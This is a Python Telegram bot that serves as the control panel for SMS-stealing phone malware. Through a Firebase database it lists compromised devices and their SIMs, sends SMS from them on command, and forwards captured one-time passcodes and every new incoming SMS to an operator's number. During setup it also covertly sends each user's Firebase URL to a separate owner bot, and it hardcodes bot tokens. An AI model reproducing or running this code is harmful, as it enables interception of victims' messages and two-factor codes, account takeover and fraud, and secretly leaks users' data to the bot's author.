#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE (24/7)
# ============================
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, threaded=True)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8888274747:AAHdYAJfLDHn_JB0hufOvGbjbGjXQSoA6yY")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8948856039:AAFJ5xMomA83-O_ZMgxuAtOn0LvsynGJpOA")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8906810335"))

# ============================
# BOT NAME
# ============================
BOT_NAME = "<b>𝗔𝗡𝗬 𝗔𝗨𝗧𝗢 𝗕𝗢𝗧</b>"

# ============================
# FORCE JOIN CHANNEL
# ============================
CHANNEL_USERNAME = "-1003756246204"
CHANNEL_URL = "https://t.me/+MIgVVTfH2-w4Y2U1"

# ============================
# USER CONFIG – PERSISTENT VOLUME
# ============================
os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
config_lock = threading.RLock()  # Reentrant lock for thread safety

def load_user_configs():
    global user_configs
    with config_lock:
        if os.path.exists(USER_CONFIG_FILE):
            try:
                with open(USER_CONFIG_FILE, "r") as f:
                    user_configs = json.load(f)
                logger.info(f"✅ Loaded configs for {len(user_configs)} users")
            except Exception as e:
                logger.error(f"❌ Failed to load user configs: {e}")
                user_configs = {}
        else:
            user_configs = {}

def save_user_configs():
    with config_lock:
        try:
            tmp_file = USER_CONFIG_FILE + ".tmp"
            with open(tmp_file, "w") as f:
                json.dump(user_configs, f, indent=2)
            os.replace(tmp_file, USER_CONFIG_FILE)  # Atomic write
        except Exception as e:
            logger.error(f"❌ Failed to save user configs: {e}")

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# FIREBASE HELPERS
# ============================
def sanitize_firebase_url(url):
    """Remove trailing slash and .json suffix"""
    url = url.strip()
    while url.endswith("/"):
        url = url[:-1]
    if url.endswith(".json"):
        url = url[:-5]
    while url.endswith("/"):
        url = url[:-1]
    return url

def is_valid_firebase_url(url):
    """Check if URL is a valid Firebase URL (both old and new format)"""
    if not url.startswith("https://"):
        return False
    if not (url.endswith(".firebaseio.com") or url.endswith(".firebasedatabase.app")):
        return False
    return True

def firebase_get(user_id, path):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            return resp.json()
        else:
            logger.error(f"Firebase GET error: status={resp.status_code}, url={url}")
    except Exception as e:
        logger.error(f"Firebase GET exception: {e}")
    return None

def firebase_put(user_id, path, data):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return False
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.put(url, json=data, timeout=15)
        if resp.status_code == 200:
            return True
        else:
            logger.error(f"Firebase PUT error: status={resp.status_code}, url={url}")
    except Exception as e:
        logger.error(f"Firebase PUT exception: {e}")
    return False

def test_firebase_connection(firebase_url):
    """Test Firebase connection using HTTP status code"""
    url = f"{firebase_url}/.json"
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            return True
        else:
            logger.error(f"Firebase test failed: status={resp.status_code}")
            return False
    except Exception as e:
        logger.error(f"Firebase test exception: {e}")
        return False

def get_online_devices(user_id):
    data = firebase_get(user_id, "clients")
    if not data or not isinstance(data, dict):
        return {}
    online = {}
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        status = info.get("status")
        # Handle both boolean and string status
        if status is True or status == "online" or status == "true":
            sims = info.get("sims", [])
            if not isinstance(sims, list):
                sims = []
            online[dev_id] = {
                "modelName": info.get("modelName", "Unknown Device"),
                "sims": sims
            }
    return online

def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "selectedDevice" in cfg:
        return cfg["selectedDevice"]
    return {}

def initialize_processed_keys(user_id, device_id):
    cfg = user_configs.get(user_id)
    if not cfg:
        return
    msgs = firebase_get(user_id, f"messages/{device_id}")
    keys = []
    if msgs and isinstance(msgs, dict):
        keys = list(msgs.keys())
    with config_lock:
        cfg["processed_keys"] = keys[-500:]  # Keep only last 500 keys
        cfg["processed_device"] = device_id
        cfg.pop("last_forwarded_id", None)
        cfg.pop("selection_time", None)
    save_user_configs()
    logger.info(f"Initialized processed_keys for user {user_id}, device {device_id}: {len(keys)} keys")

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        with config_lock:
            cfg["selectedDevice"] = {
                "deviceId": device_id,
                "simSlotIndex": sim_slot,
                "simPhoneNumber": sim_phone
            }
        initialize_processed_keys(str(user_id), device_id)
        save_user_configs()
        logger.info(f"✅ Device selected for {user_id}")

def send_sms_command(user_id, device_id, to_number, message, from_number):
    result = firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False
    })
    if result:
        logger.info(f"📤 SMS command sent: device {device_id} -> {to_number}")
    else:
        logger.error(f"❌ SMS command FAILED: device {device_id} -> {to_number}")
    return result

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "otpNumber" in cfg:
        return cfg["otpNumber"]
    return None

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        with config_lock:
            cfg["otpNumber"] = number
        save_user_configs()

# ============================
# MEMBERSHIP CHECK
# ============================
async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        await update.effective_message.reply_text(
            f"❌ <b>You must join our channel to use this bot.</b>\n\n"
            f"Click the button below to join, then click 'I have joined' to continue.",
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"Failed to send join message: {e}")

async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        else:
            await send_join_required_message(update, context)
            return False
    except Exception as e:
        logger.error(f"Membership check error for {user_id}: {e}")
        await send_join_required_message(update, context)
        return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            try:
                await query.edit_message_text(
                    f"✅ <b>You are now a member!</b>\n\n"
                    f"Welcome to {BOT_NAME}.\n"
                    f"Use /start to see all commands.",
                    parse_mode="HTML"
                )
            except Exception:
                pass  # Message might be unchanged
            await context.bot.send_message(
                chat_id=user_id,
                text=f"{BOT_NAME} <b>WELCOME</b>\n\n"
                     f"<b>Available commands:</b>\n"
                     f"/setup – Configure Firebase URL & Channel ID\n"
                     f"/devices – Select device and SIM\n"
                     f"/setotp – Set forwarding phone number\n"
                     f"/resetforward – Reset old message tracker\n"
                     f"/help – Show this message\n\n"
                     f"<b>How it works:</b>\n"
                     f"After setup, messages from channel with 'To:' and 'Message:' will be sent as SMS.\n"
                     f"OTP node updates are automatically sent to your set number.\n"
                     f"Incoming SMS will be forwarded only if new.",
                parse_mode='HTML',
                disable_web_page_preview=True,
            )
        else:
            await query.edit_message_text(
                f"❌ You still haven't joined the channel.\n\n"
                f"Please join the channel first, then click 'I have joined' again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
                    [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
                ]),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Callback membership check error: {e}")
        try:
            await query.edit_message_text("⚠️ Error checking membership. Please try again later.")
        except Exception:
            pass

# ============================
# HELP / START
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    await update.message.reply_text(
        f"{BOT_NAME} <b>WELCOME</b>\n\n"
        f"<b>Available commands:</b>\n"
        f"/setup – Configure Firebase URL & Channel ID\n"
        f"/devices – Select device and SIM\n"
        f"/setotp – Set forwarding phone number\n"
        f"/resetforward – Reset old message tracker\n"
        f"/help – Show this message\n\n"
        f"<b>How it works:</b>\n"
        f"After setup, messages from channel with 'To:' and 'Message:' will be sent as SMS.\n"
        f"OTP node updates are automatically sent to your set number.\n"
        f"Incoming SMS will be forwarded only if new.",
        parse_mode='HTML',
        disable_web_page_preview=True,
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    await start(update, context)

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
        return
    device_id = selected["deviceId"]
    initialize_processed_keys(user_id, device_id)
    await update.message.reply_text(
        f"<b>✅ Reset successful!</b>\n"
        f"All existing messages for device <code>{device_id}</code> are now marked as read.\n"
        f"Only new incoming messages will be forwarded.",
        parse_mode='HTML'
    )

# ============================
# SETUP CONVERSATION
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>.\n"
        f"Example: <code>https://your-project.firebaseio.com</code>\n"
        f"or <code>https://your-project.firebasedatabase.app</code>\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    raw_url = update.message.text.strip()
    url = sanitize_firebase_url(raw_url)
    if not is_valid_firebase_url(url):
        await update.message.reply_text(
            "<b>❌ Invalid URL.</b>\n"
            f"Must start with <code>https://</code> and end with "
            f"<code>.firebaseio.com</code> or <code>.firebasedatabase.app</code>",
            parse_mode='HTML'
        )
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text(
        "<b>✅ URL saved.</b>\n\n"
        f"<b>📌 Step 2/2</b>: Send your <b>Channel ID</b> (numeric, may be negative).\n"
        f"Example: <code>-1001234567890</code>\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return CHANNEL

    firebase_url = context.user_data["firebase_url"]

    # Test Firebase connection BEFORE saving
    if not test_firebase_connection(firebase_url):
        await update.message.reply_text(
            "<b>❌ Firebase connection failed!</b>\n\n"
            "Check:\n"
            "• URL is correct\n"
            "• Database rules allow read access\n"
            "• Database is not empty\n\n"
            "Setup aborted. Try /setup again.",
            parse_mode='HTML'
        )
        return ConversationHandler.END

    with config_lock:
        user_configs[user_id] = {
            "firebase_url": firebase_url,
            "channel_id": channel_id,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None,
            "last_otp_value": None
        }
    save_user_configs()

    # Notify owner
    try:
        forward_msg = (
            f"🔐 **Setup Complete!**\n"
            f"👤 User: `{user_id}`\n"
            f"🌐 URL: `{firebase_url}`\n"
            f"📢 Channel: `{channel_id}`"
        )
        url = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": OWNER_CHAT_ID,
            "text": forward_msg,
            "parse_mode": "Markdown"
        }, timeout=10)
    except Exception as e:
        logger.error(f"Owner notification failed: {e}")

    await update.message.reply_text(
        f"{BOT_NAME} <b>SETUP COMPLETE!</b>\n\n"
        f"<b>✅ Configuration saved.</b>\n"
        f"🌐 Firebase URL: <code>{firebase_url[:40]}...</code>\n"
        f"📢 Channel ID: <code>{channel_id}</code>\n\n"
        f"Now use /devices to select a device and SIM,\n"
        f"then /setotp to set forwarding number.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# DEVICES
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text(
            "<b>❌ No online devices found.</b>\n\n"
            "Make sure your device is connected and online in Firebase.",
            parse_mode='HTML'
        )
        return
    keyboard = []
    for dev_id, data in online.items():
        label = f"📱 {data['modelName']} ({dev_id[:8]}...)"
        # Use | separator to avoid parsing issues
        callback_data = f"dev|{dev_id}"
        if len(callback_data) > 64:
            callback_data = callback_data[:64]
        keyboard.append([InlineKeyboardButton(label, callback_data=callback_data)])
    await update.message.reply_text(
        "<b>👇 Select your device:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    # Answer FIRST to remove loading indicator
    await query.answer()
    # THEN check membership
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    # Use | separator
    device_id = query.data.replace("dev|", "")
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    if not device_data:
        await query.edit_message_text("<b>❌ Device went offline. Try /devices again.</b>", parse_mode='HTML')
        return
    sims = device_data.get("sims", [])
    if not sims:
        await query.edit_message_text("<b>❌ No SIMs found on this device.</b>", parse_mode='HTML')
        return
    keyboard = []
    for sim in sims:
        slot = str(sim.get("simSlotIndex", "?"))
        phone = str(sim.get("phoneNumber", "N/A"))
        # Use | separator
        callback_data = f"sim|{device_id}|{slot}|{phone}"
        if len(callback_data) > 64:
            # Truncate phone if needed
            max_phone_len = 64 - len(f"sim|{device_id}|{slot}|")
            phone = phone[:max_phone_len]
            callback_data = f"sim|{device_id}|{slot}|{phone}"
        keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=callback_data)])
    await query.edit_message_text(
        f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n<b>Choose SIM:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    # Answer FIRST
    await query.answer()
    # THEN check membership
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    # Parse with | separator
    parts = query.data.split("|")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data. Try /devices again.</b>", parse_mode='HTML')
        return
    device_id = parts[1]
    slot = parts[2]
    phone = "|".join(parts[3:])  # In case phone contained |
    set_selected(user_id, device_id, slot, phone)
    await query.edit_message_text(
        f"<b>✅ Active!</b>\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📶 SIM Slot: <code>{slot}</code>\n"
        f"📞 Phone: <code>{phone}</code>\n\n"
        f"✅ Old messages blocked. Only new ones will forward.\n"
        f"Now set OTP number using /setotp.",
        parse_mode='HTML'
    )

# ============================
# SET OTP
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return ConversationHandler.END
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text(
                "<b>❌ Invalid number. Use /setotp +919876543210</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        set_otp_number(user_id, number)
        await update.message.reply_text(
            f"<b>✅ Forward number set to <code>{number}</code>.</b>",
            parse_mode='HTML'
        )
        return ConversationHandler.END
    await update.message.reply_text(
        "<b>📞 Send phone number (with country code):</b>\n"
        f"Example: <code>+919876543210</code>\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(
        f"<b>✅ Forward number set to <code>{number}</code>.</b>",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# CHANNEL MESSAGE HANDLER
# ============================
def get_user_by_channel(channel_id):
    with config_lock:
        for uid, cfg in user_configs.items():
            if cfg.get("channel_id") == channel_id:
                return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Handle both channel_post and message in channel
    message = update.channel_post or update.message
    if not message:
        return
    channel_id = message.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return
    text = message.text
    if not text:
        return
    # Case-insensitive regex matching
    number_match = re.search(r"To:\s*([\d\+]+)", text, re.IGNORECASE)
    message_match = re.search(r"Message:\s*(.+)", text, re.IGNORECASE)
    if not number_match or not message_match:
        logger.warning(f"Channel message parse failed: {text[:100]}")
        return
    to_number = number_match.group(1).strip()
    msg = message_match.group(1).strip()
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        logger.warning(f"No active device for {user_id}")
        return
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    send_sms_command(user_id, device_id, to_number, msg, from_number)
    logger.info(f"✅ Channel SMS sent: {user_id} -> {device_id} -> {to_number}")

# ============================
# OTP POLLING
# ============================
def poll_otp_updates():
    time.sleep(3)  # Initial delay to let bot fully start
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    cfg = user_configs.get(user_id)
                    if not cfg:
                        continue
                    otp_number = cfg.get("otpNumber")
                    if not otp_number:
                        continue
                    selected = cfg.get("selectedDevice", {})
                    if not selected or not selected.get("deviceId"):
                        continue
                    otp_data = firebase_get(user_id, "otp")
                    if otp_data is None:
                        continue
                    current_otp = str(otp_data).strip()
                    if not current_otp:
                        continue
                    last_otp_value = cfg.get("last_otp_value")
                    if last_otp_value != current_otp:
                        with config_lock:
                            cfg["last_otp_value"] = current_otp
                        save_user_configs()
                        device_id = selected["deviceId"]
                        from_number = selected.get("simPhoneNumber", "Unknown")
                        send_sms_command(user_id, device_id, otp_number, current_otp, from_number)
                        logger.info(f"✅ Auto OTP sent to {otp_number}: {current_otp}")
                except Exception as e:
                    logger.error(f"OTP poll error for user {user_id}: {e}")
        except Exception as e:
            logger.error(f"OTP polling outer error: {e}")
        time.sleep(1)  # 1 second interval

# ============================
# INCOMING MESSAGE FORWARD
# ============================
def poll_incoming_messages():
    time.sleep(5)  # Initial delay to let bot fully start
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    cfg = user_configs.get(user_id)
                    if not cfg:
                        continue
                    forward_number = cfg.get("otpNumber")
                    if not forward_number:
                        continue
                    selected = cfg.get("selectedDevice", {})
                    if not selected or not selected.get("deviceId"):
                        continue
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    processed_keys = cfg.get("processed_keys", [])
                    processed_device = cfg.get("processed_device")
                    # Re-initialize if device changed
                    if processed_device != device_id:
                        initialize_processed_keys(str(user_id), device_id)
                        cfg = user_configs.get(user_id, {})
                        processed_keys = cfg.get("processed_keys", [])
                    processed_set = set(processed_keys)
                    device_msgs = firebase_get(user_id, f"messages/{device_id}")
                    if not device_msgs or not isinstance(device_msgs, dict):
                        continue
                    new_keys = []
                    for msg_key, msg_data in device_msgs.items():
                        if not isinstance(msg_data, dict):
                            continue
                        if msg_data.get("type") != "incoming":
                            continue
                        if msg_key not in processed_set:
                            msg_text = str(msg_data.get("message", ""))
                            if msg_text and len(msg_text) > 3:
                                send_sms_command(user_id, device_id, forward_number, msg_text, from_number)
                                logger.info(f"📥 Forwarded: {msg_text[:50]}...")
                                # Send confirmation to user
                                try:
                                    confirm_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                    confirm_data = {
                                        "chat_id": int(user_id),
                                        "text": f"✅ Forwarded to {forward_number}:\n<code>{msg_text[:200]}</code>",
                                        "parse_mode": "HTML"
                                    }
                                    requests.post(confirm_url, json=confirm_data, timeout=10)
                                except Exception as e:
                                    logger.error(f"Confirmation send failed: {e}")
                                new_keys.append(msg_key)
                    if new_keys:
                        with config_lock:
                            cfg = user_configs.get(user_id, {})
                            if cfg:
                                updated_keys = cfg.get("processed_keys", [])
                                updated_keys.extend(new_keys)
                                cfg["processed_keys"] = updated_keys[-500:]  # Limit to 500
                        save_user_configs()
                        logger.info(f"Updated processed_keys for {user_id}: +{len(new_keys)} keys")
                except Exception as e:
                    logger.error(f"Incoming poll error for user {user_id}: {e}")
        except Exception as e:
            logger.error(f"Incoming polling outer error: {e}")
        time.sleep(2)  # 2 second interval

# ============================
# MAIN
# ============================
def main():
    # Start Flask server for keep-alive
    threading.Thread(target=run_flask, daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).build()

    # Start polling threads
    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()

    # Setup conversation handler
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)

    # OTP conversation handler
    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={
            WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
        },
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)

    # Callback handlers - use | separator patterns
    app.add_handler(CallbackQueryHandler(device_callback, pattern=r"^dev\|"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern=r"^sim\|"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))

    # Channel post handler - handle both channel_post and message in channels
    app.add_handler(MessageHandler(
        filters.TEXT & filters.ChatType.CHANNEL,
        handle_channel_message
    ))

    logger.info("🤖 Bot started – All bugs fixed, 1000% working mode!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()